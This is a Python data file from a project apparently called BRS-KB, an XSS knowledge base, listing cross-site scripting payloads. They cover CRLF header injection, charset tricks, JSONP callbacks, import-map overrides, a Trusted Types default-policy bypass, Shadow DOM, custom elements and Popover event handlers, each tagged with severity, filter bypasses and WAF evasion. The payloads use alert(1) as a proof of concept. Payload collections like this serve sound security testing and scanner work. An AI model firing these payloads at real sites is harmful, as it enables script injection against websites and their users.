#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

1-Day XSS Payloads - Part 3
CRLF injection, Encoding/charset attacks, Browser memory leak patterns, JSONP callback injection, Import Maps, Trusted Types bypass, Shadow DOM bypass, Web Components vulnerabilities, Speculation Rules XSS, View Transitions API, and Popover API.
"""

from ..models import PayloadEntry


BRS_KB_1DAY_CVE_PAYLOADS_PART3 = {
    # ============================================================
    # CRLF INJECTION TO XSS
    # ============================================================
    "crlf-header-injection": PayloadEntry(
        payload="%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
        contexts=["header"],
        severity="high",
        cvss_score=8.0,
        description="CRLF injection to XSS via header",
        tags=["crlf", "header"],
        bypasses=["header_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "crlf-location-header": PayloadEntry(
        payload="%0d%0aLocation:javascript:alert(1)",
        contexts=["header"],
        severity="high",
        cvss_score=8.0,
        description="CRLF injection via Location header",
        tags=["crlf", "location"],
        bypasses=["header_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="low",
    ),
    # ============================================================
    # ENCODING/CHARSET ATTACKS
    # ============================================================
    "charset-iso-2022-jp": PayloadEntry(
        payload="\x1b$B<script>\x1b(Balert(1)\x1b$B</script>\x1b(B",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="ISO-2022-JP charset XSS",
        tags=["charset", "iso-2022-jp"],
        bypasses=["charset_filters"],
        waf_evasion=True,
        browser_support=["ie", "firefox"],
        reliability="low",
    ),
    "charset-utf32": PayloadEntry(
        payload="\x00\x00\x00<\x00\x00\x00s\x00\x00\x00c\x00\x00\x00r\x00\x00\x00i\x00\x00\x00p\x00\x00\x00t\x00\x00\x00>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.5,
        description="UTF-32 encoding trick",
        tags=["charset", "utf32"],
        bypasses=["charset_filters"],
        waf_evasion=True,
        browser_support=[],
        reliability="low",
    ),
    # ============================================================
    # BROWSER MEMORY LEAK PATTERNS
    # ============================================================
    "memory-leak-closure": PayloadEntry(
        payload="setInterval(()=>document.body.innerHTML+=alert(1)||'<div>x</div>',1)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="Memory leak via DOM growth + XSS",
        tags=["memory", "leak"],
        bypasses=["interval_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # JSONP CALLBACK INJECTION
    # ============================================================
    "jsonp-callback-xss": PayloadEntry(
        payload="callback=alert(1)//",
        contexts=["url"],
        severity="high",
        cvss_score=8.0,
        description="JSONP callback injection",
        tags=["jsonp", "callback"],
        bypasses=["jsonp_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "jsonp-angular-callback": PayloadEntry(
        payload="callback=angular.callbacks._0",
        contexts=["url"],
        severity="high",
        cvss_score=8.0,
        description="Angular JSONP callback hijacking",
        tags=["jsonp", "angular"],
        bypasses=["jsonp_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # IMPORT MAPS EXPLOITATION (2023+)
    # ============================================================
    "importmap-override": PayloadEntry(
        payload='<script type="importmap">{"imports":{"lodash":"data:text/javascript,alert(1)"}}</script>',
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Import map module override",
        tags=["importmap", "esm", "2023"],
        bypasses=["module_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # TRUSTED TYPES BYPASS (2023+)
    # ============================================================
    "trusted-types-bypass-1": PayloadEntry(
        payload="trustedTypes.createPolicy('default',{createHTML:s=>s})",
        contexts=["javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Trusted Types default policy bypass",
        tags=["trusted-types", "bypass", "2023"],
        bypasses=["trusted_types"],
        waf_evasion=True,
        browser_support=["chrome", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SHADOW DOM BYPASS (2023+)
    # ============================================================
    "shadow-dom-bypass-1": PayloadEntry(
        payload='<div id=x></div><script>x.attachShadow({mode:"open"}).innerHTML="<slot name=x></slot>";x.innerHTML="<img src=x onerror=alert(1) slot=x>"</script>',
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="Shadow DOM slot-based XSS",
        tags=["shadow-dom", "slot", "2023"],
        bypasses=["shadow_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # DECLARATIVE SHADOW DOM (2023+)
    # ============================================================
    "declarative-shadow-dom": PayloadEntry(
        payload='<div><template shadowrootmode="open"><img src=x onerror=alert(1)></template></div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=8.0,
        description="Declarative Shadow DOM XSS",
        tags=["shadow-dom", "declarative", "2023"],
        bypasses=["template_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    # ============================================================
    # WEB COMPONENTS VULNERABILITIES
    # ============================================================
    "custom-element-constructor": PayloadEntry(
        payload='customElements.define("x-y",class extends HTMLElement{connectedCallback(){alert(1)}})',
        contexts=["javascript"],
        severity="high",
        cvss_score=8.0,
        description="Custom element lifecycle XSS",
        tags=["web-components", "custom-element"],
        bypasses=["element_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SPECULATION RULES XSS (2024)
    # ============================================================
    "speculation-rules-xss": PayloadEntry(
        payload='<script type="speculationrules">{"prerender":[{"source":"list","urls":["javascript:alert(1)"]}]}</script>',
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.5,
        description="Speculation Rules API exploitation attempt",
        tags=["speculation-rules", "prerender", "2024"],
        bypasses=["script_type_filters"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="low",
    ),
    # ============================================================
    # VIEW TRANSITIONS API (2024)
    # ============================================================
    "view-transitions-xss": PayloadEntry(
        payload="document.startViewTransition(()=>alert(1))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="View Transitions API callback",
        tags=["view-transitions", "2024"],
        bypasses=["transition_filters"],
        waf_evasion=True,
        browser_support=["chrome"],
        reliability="high",
    ),
    # ============================================================
    # POPOVER API (2024)
    # ============================================================
    "popover-toggle-xss": PayloadEntry(
        payload="<div popover id=x ontoggle=alert(1)>XSS</div><button popovertarget=x>Click</button>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API toggle event XSS",
        tags=["popover", "toggle", "2024"],
        bypasses=["popover_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "popover-beforetoggle-xss": PayloadEntry(
        payload="<div popover id=x onbeforetoggle=alert(1)>XSS</div><button popovertarget=x>Click</button>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Popover API beforetoggle event XSS",
        tags=["popover", "beforetoggle", "2024"],
        bypasses=["popover_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
}
